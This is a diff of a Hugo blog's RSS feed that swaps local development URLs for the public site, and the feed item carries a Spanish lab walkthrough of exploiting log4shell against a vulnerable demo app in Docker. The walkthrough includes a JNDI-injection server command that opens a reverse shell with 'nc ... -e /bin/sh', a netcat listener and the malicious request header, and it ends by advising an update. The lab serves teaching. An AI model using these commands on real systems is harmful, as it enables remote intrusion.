@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Backend on pacodiazdg.github.io</title>
-    <link>http://10.10.8.69:1313/tags/backend/</link>
+    <link>https://pacodiazdg.github.io/tags/backend/</link>
     <description>Recent content in Backend on pacodiazdg.github.io</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="http://10.10.8.69:1313/tags/backend/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 07 Jun 2025 10:30:00 -0600</lastBuildDate><atom:link href="https://pacodiazdg.github.io/tags/backend/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Acerca de log4shell</title>
-      <link>http://10.10.8.69:1313/posts/acerca-de-log4shell/</link>
+      <link>https://pacodiazdg.github.io/posts/acerca-de-log4shell/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>http://10.10.8.69:1313/posts/acerca-de-log4shell/</guid>
+      <guid>https://pacodiazdg.github.io/posts/acerca-de-log4shell/</guid>
       <description>log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
 Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
 git clone https://github.</description>
@@ -21,9 +21,9 @@ git clone https://github.</description>
 &lt;p&gt;Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable &lt;a href=&#34;https://github.com/christophetd/log4shell-vulnerable-app&#34;&gt;https://github.com/christophetd/log4shell-vulnerable-app&lt;/a&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/christophetd/log4shell-vulnerable-app.git
 docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://pacodiazdg.github.io/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://pacodiazdg.github.io/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;La parte que nos interesa es:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;@GetMapping&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;@RequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-Api-Version&amp;#34;&lt;/span&gt;) String apiVersion) {
@@ -36,7 +36,7 @@ docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vu
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  &lt;a href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;&gt;https://github.com/welk1n/JNDI-Injection-Exploit&lt;/a&gt;&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C &amp;#34;nc 172.17.0.1 4444 -e /bin/sh&amp;#34; 
 nc -lvp 4444
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://pacodiazdg.github.io/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Solo hacemos un http request con el header X-Api-Version y con la dirección que nos proporcionó JNDI Injection&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; / &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.1.141:8081&lt;/span&gt;
@@ -46,8 +46,8 @@ nc -lvp 4444
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://pacodiazdg.github.io/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;https://pacodiazdg.github.io/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;debido a que la vulnerabilidad ya se encuentra arreglada en las nuevas versiones de Log4j  solo queda actualizar&lt;/p&gt;
 </content>
     </item>
